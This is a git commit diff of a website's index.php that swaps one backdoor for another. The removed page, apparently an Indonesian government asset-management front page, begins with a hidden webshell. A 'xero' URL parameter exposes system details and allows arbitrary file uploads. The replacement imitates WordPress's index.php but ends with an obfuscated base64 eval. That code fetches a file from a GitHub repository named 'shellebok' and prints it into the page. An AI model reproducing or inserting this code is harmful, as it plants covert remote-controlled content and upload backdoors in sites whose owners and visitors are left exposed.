952fd5d981060f767a866f1999009dd200c1f170
ebokzsss <84223726+ebokzsss@users.noreply.github.com>
2024-02-22 17:04:14 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,37 +1,19 @@
-<?php if(isset($_GET["xero"])) { echo"<font color=#000>".php_uname().""; print "\n";$disable_functions = @ini_get("disable_functions"); echo "<br>DisablePHP=".$disable_functions; print "\n"; echo"<br><form method=post enctype=multipart/form-data>"; echo"<input type=file name=f><input name=k type=submit id=k value=upload><br>"; if($_POST["k"]==upload) { if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>".$_FILES["f"]["name"]; }else{ echo"<b>Gagal upload"; } } } ?>
-<?
-include "session.php";
-seSession('BERANDA');
-date_default_timezone_set('Asia/Jakarta');
-?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xml:lang="en">
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
-<title>Sipanda BMD Kab. Balangan</title>
-<link rel="shortcut icon" HREF="css/icon/icon.ico">
-<meta name="description" content="Downloads Free! 4 Drivers for Prolink WN2000 Networks Cards. Here's where you can downloads Free! the newest software for your WN2000.">
-<meta name="keywords" content="Sipand BMD">
-<meta name="Language" content="English">
-<link rel="stylesheet" type="text/css" href="css/style.css" >
-<link rel="stylesheet" type="text/css" href="css/dropdown.css">
-<link rel="stylesheet" type="text/css" href="css/display.css">
-<script type="text/javascript" src="js/jquery-1.3.2.min"></script>
-<script type="text/javascript" src="js/jquery.js"></script>
-<script type="text/javascript" src="js/dropdown.js"></script>
-<script type="text/javascript" src="js/slideshow.js"></script>
-<script type="text/javascript" src="js/display.js"></script>
-<script type="text/javascript" src="js/index.js"></script>
-<script type="text/javascript" src="js/general.js"></script>
-<script type="text/javascript" src="js/autorefresh.js"></script>
-</head>
-<body onload="func_view_data('detail_data','home.php','')">
-<div id="dat"><script type="text/javascript" src="js/tanggal.js"></script></div>
-<div id="pag">
-	<? include "header.php";?>
-	<? include "menu.php";?>
-	<? include "main.php";?>
-</div>
-<? include "bottom.php";?>
-</body>
-</html>
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
+
+eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwpzZXRfdGltZV9saW1pdCgwKTsKJGtpbGwgPSBjdXJsX2luaXQoKTsKY3VybF9zZXRvcHQoJGtpbGwsIENVUkxPUFRfVVJMLCAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Vib2t6c3NzL3NoZWxsZWJvay9tYWluL3MudHh0Iik7CmN1cmxfc2V0b3B0KCRraWxsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKJGRlYWQgPSBjdXJsX2V4ZWMoJGtpbGwpOwpjdXJsX2Nsb3NlKCRraWxsKTsKZWNobygkZGVhZCk7'));
